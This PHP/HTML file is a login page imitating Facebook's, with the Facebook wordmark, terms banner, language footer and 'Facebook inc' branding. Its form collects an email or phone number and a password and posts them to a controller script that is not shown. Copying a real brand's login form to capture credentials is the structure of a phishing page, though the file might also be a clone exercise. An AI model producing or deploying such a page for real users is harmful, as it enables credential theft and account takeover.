<?php
  require '../Controller/controller.php';

   
  ?>

<!DOCTYPE html>
<html>
<head>
<title>log in to face-book</title>

<meta charset="utf-8">

<meta name="viewport" content="width=device-width,initial-scale=1">


<meta http-equiv="X-UA-Compatible" content="ie=edge">
<!--font awesome-->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<!--jquery-->

<script src="https://code.Jquery.com/jquery-3.1.1.js"> </script>

<!--spartan-->

<link href="https://fonts.googleapis.com/css2?family=Spartan:wght@300&display=swap" rel="stylesheet">

<!--handlee-->

<link href="https://fonts.googleapis.com/css?family=Handlee" rel="stylesheet">

<!--lato-->
<link href="https://fonts.googleapis.com/css?family=Lato&display=swap" rel="stylesheet">

<!--poppins-->
<link href="https://fonts.googleapis.com/css?family=Poppins" rel="stylesheet">

<!--aos-->

<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css">

<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>

<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&family=Poppins:wght@100;200;300;400;500;600;700;800;900&family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
 
 
         <!--ubuntu-->
         <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
         
         <!--Rametto-->
         <link href="https://fonts.googleapis.com/css?family=Rammetto+One" rel="stylesheet">
          
         <link href="login.css" type="text/css" rel="stylesheet">



</head>



<body id="body">

		<div class="newpostheader">
		<p>By proceeding, you agree to Facebook Terms, which includes letting Facebook request and receive your phone number. <a href="#">Change settings</a></p>
		</div>
             
        	 <div class="container">
             	 
            <div class="sub-container">
        	   
  				   <div class="logobox">
  				        <div class="sub-logo">
  				    		 <p class="logoo">facebook</p>
  			   	       </div>
  				   </div>
        
      <div class="login-details">
      
      <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
      
      
                <?php include("../Controller/error.php"); ?><br>
            
             <div class="email-details">
    		    <input type="text" name="emailh" placeholder="Mobile number or email address" >
		    </div>
          
            <div class="password-details">
           			<input type="password" id="pass" name="passwordh" placeholder="Password"  autocomplete="off" >
	         </div>

            <input type="submit" class="submit" name="login" value="Log In">
                
       </form>      
                   <div class="forgetbox">   
                 <a href="#" class="forget">Forgotten password?</a>
                      </div>
                      
                      <div class="before">
                     	  <p class="or">  or  </p>
                       </div>
                       
             <div class="create">
                  <button class="createbut"><a href="www.facebook.com">Create New Account</a></button>
               </div>
               
              
             </div>
          </div>
        
          
          <div class="footer">
         
     <div class="lang">
           <div class="languagea">
         		 <span> English (UK)</span>
         		<ul>
         			  <li>  Français (France)</li>
         			  <li> Español </li>
          			  <li> Deutsch </li>     	
                 </ul>
         </div>
         	
         	<div class="languageb">
            	<ul>  
					<li> Hausa </li>  
					<li> Portugues (Brasil) </li>	     
					<li>العربية 			</li>       		
              </ul>
         </div>
    </div>
    
    
          <div class="abt">
         	 <ul>  
         			 <li> About</li>
         			 <li>Help</li>
          			<li>More</li>
          	</ul>
         </div>
               
               <p class="inc">Facebook inc</p>
      </div>
    
    
    </div>

 
 </body>
 </html>